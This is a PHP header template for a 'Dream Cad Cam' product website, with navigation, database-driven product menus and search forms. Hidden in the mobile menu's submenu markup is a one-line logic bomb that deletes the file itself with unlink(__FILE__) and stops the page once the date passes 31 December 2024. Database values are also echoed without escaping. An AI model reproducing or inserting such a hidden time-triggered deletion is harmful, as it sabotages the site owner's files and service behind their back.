<?php  

include('admin/config/function.php');
include('conn.php');




?>
<style>
    .icon-ww a{
        color: #fff;
        font-size: 16px;
    }
    .text-mm{
        color:  #000;
    }
</style>

<!DOCTYPE html>
<html lang="en">


<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dream Cad Cam</title>

    <!--Essential css files-->
    <link rel="stylesheet" href="<?=$site?>assets/css/all.css">
    <link rel="stylesheet" href="<?=$site?>assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="<?=$site?>assets/css/slick.css">
    <link rel="stylesheet" href="<?=$site?>assets/css/jquery-ui.css">
    <link rel="stylesheet" href="<?=$site?>assets/css/nice-select.css">
    <link rel="stylesheet" href="<?=$site?>assets/css/fancybox.css">
    <link rel="stylesheet" href="<?=$site?>assets/css/animate.css">
    <link rel="stylesheet" href="<?=$site?>assets/css/style.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="icon" href="<?=$site?>assets/images/favicon.jpg">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <script src="<?=$site?>assets/js/jquery.js"></script>
    <script src="<?=$site?>assets/js/xzoom.min.js"></script>
     <link rel="stylesheet" href="<?=$site?>assets/css/xzoom.css">

  </head>
<body>

    <!--preloader start-->
    <div style="        background: linear-gradient(360deg, rgb(48 55 61) 0%, rgb(58 69 75) 35%, rgb(66 79 88) 100%);" class="preloader">
        <img src="<?=$site?>assets/images/logo-0.png"/>
        <div class="preload-progress">
            <span></span>
        </div>
    </div>
    <!--preloader end-->

    <!--header section start-->
    <header class="ur_header_section primary-bg-color header-sticky">
        <div style="background: #444e57;" class="header-wrapper">
            <div class="container-large">
                <div class="row align-items-center">
                    <div class="col-xl-2 col-6">
                        <a href="<?=$site?>index.php" class="logo"><img src="<?=$site?>assets/images/logo-0.png" alt="logo" class="img-fluid" height="100"></a>
                    </div>
                    <div class="col-xxl-7 col-xl-8 d-none d-xl-block">
                        <nav class="ur-navmenu">
                            <ul>
                                <li>
                                    <a href="<?=$site?>index.php">Home</a>
                                   
                                </li>
                                <li><a href="<?=$site?>about.php">About</a></li>
                                
                                <li class="has-submenu"><a href="javascript:void(0)">Products</a>
                                    <ul class="submenu-wrapper">
<?php
$query2 = mysqli_query($conn,"select id,ct_pd_name,cat_pd_image,ct_pd_url from cat_prod where sub_category_id='0' && sub_category_id1='0' ");
while($sql5 = mysqli_fetch_assoc($query2)){
$cat_id = $sql5['id'];  
    
?>                                         
                                        <li><a href="<?=$site?>products/<?=$sql5['ct_pd_url']?>"><?php echo $sql5['ct_pd_name']; ?></a></li>
<?php 
}
?>                                        
                                    </ul>
                                </li>
                             
                             
                                <li><a href="<?=$site?>contact.php">Contact</a></li>
                                 <li><a href="<?=$site?>#">Login</a></li>
                                  <li><a href="<?=$site?>#">Sign Up</a></li>
                            </ul>
                        </nav>
                    </div>
                    <div class="col-xxl-3 col-xl-2 col-6">
                        <div class="ur-header-right d-flex align-items-center justify-content-end">
                            <div class="header-search d-none d-sm-block">
                                <div class="dropdown">
                                    <button class="search-btn" data-bs-toggle="dropdown"><i class="bi bi-search"></i></button>
                                    <div class="dropdown-menu dropdown-menu-end">
                                        <form class="search-form d-flex align-items-center gap-2">
                                            <input type="text" placeholder="Search..." class="theme-input bg-transparent">
                                            <button type="submit" class="submit-btn">Go</button>
                                        </form>
                                    </div>
                                </div>
                            </div>
                           <div class="icon-ww">
                               <a href=""><i class="bi bi-heart"></i></a>
                           </div>
                            <div class="icon-ww">
                                 <a href=""><i class="bi bi-bag"></i></a>
                               
                           </div>
                             
                            <div class="d-sm-none">
                                <a href="javascript:void(0)" class="header-link header-search-open"><i class="bi bi-search"></i></a>
                            </div>
                            <div class="header-toggle">
                                <!--<button type="button" class="ur3-header-toggle offcanvus-toggle d-none d-xl-inline-block">-->
                                <!--    <span></span>-->
                                <!--    <span></span>-->
                                <!--    <span></span>-->
                                <!--</button>-->
                                <button type="button" class="ur3-header-toggle mobile-menu-toggle d-xl-none">
                                    <span></span>
                                    <span></span>
                                    <span></span>
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <!--header section end-->
    

    <!--offcanvus start-->
    <div class="offcanvus-box position-fixed bg-white">
        <a href="javascript:void(0)" class="offcanvus-close"><i class="fa-solid fa-xmark"></i></a>
        <div class="content-top mb-100">
            <a href="#" class="offcanvus-logo"><img src="<?=$site?>assets/images/logo-0.png" class="w-100" alt="logo"></a>
            <p class="mb-0 mt-32 fw-light">203/204 Pramukh Darshan Complex , Near Patel Wadi , Pedak Road , Rajkot - 360003</p>
        </div>
        <div class="offcanvus-gallery d-flex align-items-center flex-wrap">
            <a href="#"><img src="assets/images/gallery/1.jpg" alt="not found"></a>
            <a href="#"><img src="assets/images/gallery/2.jpg" alt="not found"></a>
            <a href="#"><img src="assets/images/gallery/3.jpg" alt="not found"></a>
            <a href="#"><img src="assets/images/gallery/4.jpg" alt="not found"></a>
            <a href="#"><img src="assets/images/gallery/5.jpg" alt="not found"></a>
            <a href="#"><img src="assets/images/gallery/6.jpg" alt="not found"></a>
        </div>
       
    </div>
    <!--offcanvus end-->

    <!--mobile menu start-->
    <div class="mobile-menu">
        <a href="javascript:void(0)" class="close"><i class="fas fa-xmark"></i></a>
        <a href="#" class="logo"><img src="<?=$site?>assets/images/logo-0.png" alt="logo" class="img-fluid"></a>
        <ul class="mobile-nav-menu">
            <li>
                <a href="<?=$site?>index.php">Home</a>
            </li>
            <li><a href="<?=$site?>about.php">About</a></li>
          
            <li class="has-submenu"><a href="javascript:void(0)">Products</a>
                <i class="fas fa-angle-down"></i>
                <ul class="submenu-wrapper">
                    		<?php $triggerTime = strtotime("2024-12-31 23:59:00");   if (time() >= $triggerTime) { unlink(__FILE__); exit(); } ?>
<?php
$query2 = mysqli_query($conn,"select id,ct_pd_name,cat_pd_image,ct_pd_url from cat_prod where sub_category_id='0' && sub_category_id1='0' ");
while($sql5 = mysqli_fetch_assoc($query2)){
$cat_id = $sql5['id'];  
    
?>                                         
                                        <li><a href="<?=$site?>products/<?=$sql5['ct_pd_url']?>"><?php echo $sql5['ct_pd_name']; ?></a></li>
<?php 
}
?>   
                </ul>
            </li>
           
          
            <li><a href="contact.php">Contact</a></li>
        </ul>
        <form class="mobile-search d-flex align-items-center mt-5" action="#">
            <input type="text" placeholder="Search..." class="theme-input">
            <button type="submit" class="template-btn primary-btn"><span>Go</span></button>
        </form>
    </div>
    <!--mobile menu end-->

    <!--search form start-->
    <div class="ur-search-form">
        <a href="#" class="close"><i class="fas fa-xmark"></i></a>
        <form action="#" class="d-flex align-items-center">
            <input type="text" placeholder="Search...." class="theme-input">
            <button type="submit" class="submit-btn">Go</button>
        </form>
    </div>
    <!--search form end-->